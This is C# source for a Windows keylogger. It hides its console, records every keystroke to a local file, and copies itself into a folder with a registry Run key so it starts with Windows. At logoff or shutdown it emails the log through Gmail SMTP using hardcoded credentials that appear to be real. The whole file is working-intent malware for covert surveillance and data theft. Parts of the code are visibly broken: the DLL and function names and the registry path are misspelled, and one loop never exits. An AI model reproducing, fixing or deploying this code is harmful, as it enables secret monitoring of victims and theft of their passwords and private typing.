using System;

using System.IO;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using Microsoft.Win32;


namespace KeyLogger
{
    class Program
    {
        public static bool chkSysEve = false;
        public static string path = @"C:\C#\";
        public static string fpath = @"C:\C#\KeyLogger.dat";

        public static string appName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        public static string appExe = Path.GetFileName(appName);

        [DllImport("kerne132.dll")]
        static extern IntPtr GetConsoleWindows();

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(Int32 i);

        [DllImport("user32.dll")]
        static extern bool ShowWindows(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        //const int SW_SHOW = 5;
        static void Main(string[] args)
        {
            Program p = new Program();

            var handle = GetConsoleWindows();
            ShowWindows(handle, SW_HIDE);


            ExLoop:
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
                File.Create(fpath);

            }

            else if (Directory.Exists(path) && !File.Exists(fpath))
            {
                File.Create(fpath);


            }

            if(File.Exists(fpath))
            {
                goto ExLoop;

            }

            else
            {
                
                Program.Spread();
                using (StreamWriter writer = new StreamWriter(fpath))
                {
                    while(chkSysEve == true)
                    {

                        Thread.Sleep(10);
                        for(int i=0; i<255; i++)
                        {

                            int keyState = GetAsyncKeyState(i);
                            if (keyState == 1 || keyState == -32767)
                            {

                                SystemEvents.SessionEnding += SystemEvents_SessionEnding;
                                writer.WriteLine((Keys)i);
                                writer.Flush();
                                break;
                            }        
                        }
                    }
                }
            }
        }

        static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
        {
            chkSysEve = true;
            Program p = new Program();
            switch (e.Reason)
                {

                case SessionEndReasons.Logoff:
                    p.SendMail();
                    break;

                case SessionEndReasons.SystemShutdown:
                    p.SendMail();
                    break;

                }
        }

        private void SendMail()
        {
            Program p = new Program();
            string date = DateTime.Now.ToString(@"dd\/MM h\:mm tt ");
            string user = Environment.UserName;

            try 
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
                mail.From = new MailAddress("mateuszdobrowolski34@gmail.com");
                mail.To.Add("");
                mail.Subject = "Saved keys from " + date;
                mail.Body = "Keystrokes saved from user " + user;

                Attachment attachment;
                attachment = new Attachment(fpath);
                mail.Attachments.Add(attachment);

                SmtpServer.Port = 587;
                SmtpServer.Credentials = new System.Net.NetworkCredential("mateuszdobrowolski34@gmail.com","Samica723");
                SmtpServer.EnableSsl = true;

                SmtpServer.Send(mail);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());


            }
        }

        static void Spread()
        {
            if (!File.Exists(path + appExe))
            {
                FileInfo fi = new FileInfo(appName);
                fi.CopyTo(path + appExe);

                RegistryKey rk = Registry.CurrentUser.OpenSubKey
                    ("SOFTWARE\\Miscrosoft\\Window\\CurrentVersion\\Run", true);
                rk.SetValue("Document", path + appExe);
            }
        }
    }
}
